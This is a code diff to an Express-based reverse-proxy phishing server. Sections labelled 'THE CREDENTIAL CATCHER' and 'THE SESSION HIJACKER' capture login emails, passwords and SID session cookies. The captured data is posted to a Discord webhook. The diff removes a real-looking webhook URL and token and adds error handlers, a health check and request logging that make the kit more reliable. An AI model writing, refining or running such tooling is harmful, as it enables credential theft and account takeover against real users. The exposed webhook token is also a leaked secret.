@@ -6,19 +6,31 @@ const httpProxy = require('http-proxy');
 
 const app = express();
 
+// GLOBAL ERROR HANDLERS (Prevents Silent Crashes)
+process.on('uncaughtException', (err) => {
+  console.error('Uncaught Exception:', err);
+});
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+});
+
 // Middleware
 app.use(cookieParser({ decode: (val) => val }));
 app.use(express.urlencoded({ extended: true, limit: '50kb' }));
 app.use(express.json({ limit: '50kb' }));
 
 // CONFIGURATION
-// REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
 
 /**
  * Sends a notification to Discord.
  */
 async function sendToDiscord(title, fields, color = 0x00ff00) {
+  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
+    console.log('[DISCORD] Webhook not configured. Skipping alert.');
+    return;
+  }
+
   const payload = {
     content: `**🚨 ${title}**`,
     embeds: [{
@@ -30,13 +42,17 @@ async function sendToDiscord(title, fields, color = 0x00ff00) {
   };
 
   try {
-    await fetch(DISCORD_WEBHOOK_URL, {
+    const response = await fetch(DISCORD_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
+    
+    if (!response.ok) {
+      console.error(`[DISCORD] Webhook failed with status: ${response.status}`);
+    }
   } catch (err) {
-    console.error('Discord Webhook Error:', err.message);
+    console.error('[DISCORD] Webhook error:', err.message);
   }
 }
 
@@ -55,8 +71,15 @@ function rewriteCookies(cookies, localDomain) {
   });
 }
 
+// HEALTH CHECK (For UptimeRobot and Debugging)
+app.get('/health', (req, res) => {
+  console.log('[HEALTH] Health check received.');
+  res.status(200).send('OK');
+});
+
 // 1. THE CREDENTIAL CATCHER (For Logged-Out Users)
 app.post('/service/lp/challenge', async (req, res) => {
+  console.log(`[CATCH] POST /service/lp/challenge received.`);
   const username = req.body.email || req.body.emailOrPhone || 'unknown';
   const password = req.body.passwd || 'unknown';
   
@@ -141,6 +164,8 @@ app.post('/service/lp/challenge', async (req, res) => {
 
 // 2. THE SESSION HIJACKER & UNIVERSAL PROXY
 app.use((req, res) => {
+  console.log(`[PROXY] ${req.method} ${req.originalUrl} received.`);
+  
   if (req.headers.cookie) {
     const cookies = req.headers.cookie;
     const sidMatch = cookies.match(/SID=([^;]+)/);
